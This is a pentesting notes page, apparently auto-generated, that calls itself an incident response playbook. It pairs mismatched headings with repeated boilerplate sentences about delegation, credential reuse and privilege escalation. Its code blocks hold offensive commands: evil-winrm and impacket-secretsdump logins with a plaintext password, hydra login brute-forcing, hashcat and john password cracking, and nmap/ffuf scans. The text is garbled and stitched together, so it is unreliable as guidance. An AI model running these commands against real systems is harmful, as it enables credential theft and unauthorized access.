---
TitleSEO: "Incident Response Playbook | ZureFX"
TitlePost: "Incident Response Playbook"
Author: "ZureFX"
Description: "Personal notes on Incident Response Playbook. Quick reference for pentesting and CTF challenges."
Keywords: "lateral movement, enumeration, privilege escalation, persistence, networking, dfir"
URL: "https://zurefx.github.io/notes/note-incident-response-playbook-771.html"
URL_IMAGES: ""
Date: "2024-09-06"
Tags: "Lateral Movement, Enumeration, Privilege Escalation, Persistence, Networking, DFIR"
Section: "notes"
Lang: "en"
main_img: "note-incident-response-playbook-771"
Permalink: "/notes/note-incident-response-playbook-771.html"
BtnLabel: "Read Notes"
Pick: 0
---
## IIS

### SSTI

Initial enumeration revealed several interesting open ports on the target. Post-exploitation enumeration revealed a path to domain administrator privileges. The kernel version was outdated and vulnerable to a publicly known exploit. The service account had excessive permissions assigned in Active Directory.

- `XXE`
- `wmiexec`
- `AlwaysInstallElevated`

```powershell
evil-winrm -i 10.13.36.178 -u administrator -p 'P@ssw0rd!'
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.124.101.37/FUZZ
nmap -sCV -p53,80,995 10.90.96.119 -oN scan.txt
nmap -sCV -p139,636,8080 10.79.106.158 -oN scan.txt
```

## CMD

### XXE

> **Note:** Constrained Delegation was identified as the primary attack vector in this scenario.

Post-exploitation enumeration revealed a path to domain administrator privileges. Group Policy Preferences contained encrypted but recoverable credentials. Group Policy Preferences contained encrypted but recoverable credentials. The backup files contained sensitive information that should not have been accessible.

Lateral movement was facilitated by reusing discovered credentials across services. Unconstrained delegation was enabled on the compromised machine. Initial enumeration revealed several interesting open ports on the target.

Unconstrained delegation was enabled on the compromised machine. Lateral movement was facilitated by reusing discovered credentials across services. Token impersonation allowed elevation to SYSTEM privileges on the target.

## Elasticsearch

### sqlmap

```python
impacket-secretsdump administrator:'P@ssw0rd!'@10.110.56.179
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
nmap -sCV -p139,9200,8888 10.92.91.131 -oN scan.txt
```

The database credentials were hardcoded in the application source code. The target system was identified as running a vulnerable version of the service. The scheduled task ran with elevated privileges and could be abused for escalation.

```powershell
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.96.201.168 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
impacket-secretsdump administrator:'P@ssw0rd!'@10.92.224.187
evil-winrm -i 10.39.31.68 -u administrator -p 'P@ssw0rd!'
```

```bash
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.10.54.220/FUZZ
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.72.89 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

## Open Redirect

### feroxbuster

The service was running without proper input validation, leading to injection vulnerabilities. Lateral movement was facilitated by reusing discovered credentials across services. Command injection was possible through unsanitized user input in the search functionality. Network traffic analysis revealed unencrypted communications containing user credentials. The service was running without proper input validation, leading to injection vulnerabilities.

```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.36.236.82 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

Unconstrained delegation was enabled on the compromised machine. Initial enumeration revealed several interesting open ports on the target.
